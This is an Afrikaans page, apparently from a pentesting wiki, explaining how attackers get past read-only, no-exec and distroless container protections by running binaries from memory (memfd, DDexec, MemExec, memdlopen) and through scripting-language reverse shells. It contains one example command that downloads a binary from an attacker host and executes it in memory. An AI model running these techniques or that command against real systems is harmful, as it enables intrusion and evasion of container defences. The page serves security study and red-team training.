# Omseil FS-beskerming: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Video's

In die volgende video's word die tegnieke wat op hierdie bladsy genoem word, meer breedvoerig verduidelik:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)<sup>[[2]](#references)</sup>

## read-only / no-exec-scenario

Dit word al hoe meer algemeen om Linux-masjiene te vind wat met **read-only (ro)-lêerstelselbeskerming gemonteer** is, veral in containers. Dit is omdat dit so eenvoudig is om 'n container met 'n ro-lêerstelsel te laat loop as om **`readOnlyRootFilesystem: true`** in die `securitycontext` te stel:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Selfs al is die lêerstelsel as ro gemonteer, sal **`/dev/shm`** steeds skryfbaar wees; dit is dus onwaar dat ons niks op die skyf kan skryf nie. Hierdie gids sal egter met **no-exec-beskerming gemonteer** wees, so as jy 'n binary hier aflaai, sal jy dit **nie kan uitvoer nie**.

> [!WARNING]
> Vanuit 'n red-team-perspektief maak dit dit **ingewikkeld om** binaries af te laai en uit te voer wat nie reeds in die stelsel is nie (soos backdoors of enumerators soos `kubectl`).

## Maklikste omseiling: Scripts

Let daarop dat ek binaries genoem het: jy kan **enige script uitvoer** solank die interpreter binne die masjien is, soos 'n **shell script** as `sh` beskikbaar is, of 'n **python** **script** as `python` geïnstalleer is.

Dit is egter nie genoeg om jou binary backdoor of ander binary tools wat jy dalk moet laat loop, uit te voer nie.

## Geheue-omseilings

As jy 'n binary wil uitvoer maar die lêerstelsel dit nie toelaat nie, is die beste manier om dit te doen om dit **vanuit geheue uit te voer**, aangesien die **beskerming nie daar van toepassing is nie**.

### FD + exec syscall bypass

As jy kragtige script engines binne die masjien het, soos **Python**, **Perl** of **Ruby**, kan jy die binary wat uitgevoer moet word vanuit geheue aflaai, dit in 'n geheue-lêerbeskrywer (`create_memfd` syscall) stoor, wat nie deur daardie beskerming geraak sal word nie, en dan 'n **`exec` syscall** aanroep wat die **fd as die lêer om uit te voer** aandui.

Hiervoor kan jy die projek [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) maklik gebruik. Jy kan 'n binary daaraan verskaf, waarna dit 'n script in die aangeduide taal genereer met die **binary saamgepers en b64-geënkodeer**, tesame met instruksies om dit te **dekodeer en te dekomprimeer** in 'n **fd** wat geskep word deur die `create_memfd` syscall aan te roep, en 'n oproep na die **exec** syscall om dit uit te voer.

> [!WARNING]
> Dit werk nie in ander scripting-tale soos PHP of Node nie, omdat hulle geen **verstekmanier het om rou syscalls** vanuit 'n script aan te roep nie. Dit is dus nie moontlik om `create_memfd` aan te roep om die **geheue-fd** te skep waarin die binary gestoor word nie.
>
> Verder sal die skep van 'n **gewone fd** met 'n lêer in `/dev/shm` nie werk nie, aangesien jy dit nie sal mag uitvoer nie omdat die **no-exec-beskerming** van toepassing sal wees.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is 'n tegniek waarmee jy die **geheue van jou eie proses** kan **wysig** deur sy **`/proc/self/mem`** te oorskryf.

Deur dus die **assembly-kode** wat deur die proses uitgevoer word, te beheer, kan jy 'n **shellcode** skryf en die proses "muteer" om **enige arbitrêre kode uit te voer**.

> [!TIP]
> **DDexec / EverythingExec** laat jou toe om jou eie **shellcode** of **enige binary** vanuit **geheue** te laai en **uit te voer**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Vir meer inligting oor hierdie tegniek, raadpleeg Github of:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) is die natuurlike volgende stap van DDexec. Dit is **DDexec shellcode wat as 'n daemon uitgevoer word**, dus hoef jy nie DDexec elke keer weer te begin wanneer jy 'n **ander binary wil uitvoer** nie. Jy kan eenvoudig memexec shellcode via die DDexec-tegniek uitvoer en dan met hierdie **daemon kommunikeer om nuwe binaries deur te gee wat gelaai en uitgevoer moet word**.

Jy kan 'n voorbeeld van hoe om **memexec te gebruik om binaries vanuit 'n PHP reverse shell uit te voer** vind by [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Met 'n soortgelyke doel as DDexec laat die [**memdlopen**](https://github.com/arget13/memdlopen)-tegniek 'n **makliker manier toe om binaries in memory te laai** om dit later uit te voer. Dit kan selfs toelaat dat binaries met dependencies gelaai word.

## Distroless Bypass

Vir 'n toegewyde verduideliking van **wat distroless werklik is**, wanneer dit help, wanneer dit nie help nie, en hoe dit post-exploitation-praktyke in containers verander, raadpleeg:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Wat is distroless

Distroless containers bevat slegs die **allerminste komponente wat nodig is om 'n spesifieke toepassing of diens uit te voer**, soos libraries en runtime dependencies, maar sluit groter komponente soos 'n package manager, shell of system utilities uit.

Die doel van distroless containers is om die **attack surface van containers te verminder deur onnodige komponente uit te skakel** en die aantal vulnerabilities wat uitgebuit kan word, te minimaliseer.

### Reverse Shell

In 'n distroless container sal jy moontlik **nie eens `sh` of `bash`** vind om 'n gewone shell te kry nie. Jy sal ook nie binaries soos `ls`, `whoami`, `id` ... vind nie; alles wat jy gewoonlik op 'n system uitvoer.

> [!WARNING]
> Daarom sal jy nie 'n **reverse shell** kan kry of die system kan **enumerate** soos jy gewoonlik doen nie.

As die gekompromitteerde container byvoorbeeld 'n Flask-webtoepassing uitvoer, is Python geïnstalleer en kan jy dus 'n **Python reverse shell** kry. As dit Node uitvoer, kan jy 'n Node rev shell kry, en dieselfde geld vir byna enige **scripting language**.

> [!TIP]
> Deur die scripting language te gebruik, kan jy die **system enumerate** deur die taal se vermoëns te benut.

As daar **geen `read-only/no-exec`**-beskerming is nie, kan jy jou reverse shell misbruik om jou binaries **na die file system te skryf** en dit **uit te voer**.

> [!TIP]
> In hierdie soort containers sal hierdie beskerming egter gewoonlik bestaan, maar jy kan die **vorige memory execution-tegnieke gebruik om dit te omseil**.

Jy kan **voorbeelde** van hoe om **sommige RCE-vulnerabilities uit te buit** om **reverse shells in scripting languages** te kry en binaries vanuit memory uit te voer, vind by [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

## Verwysings

- [1] [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)

{{#include ../../../../banners/hacktricks-training.md}}
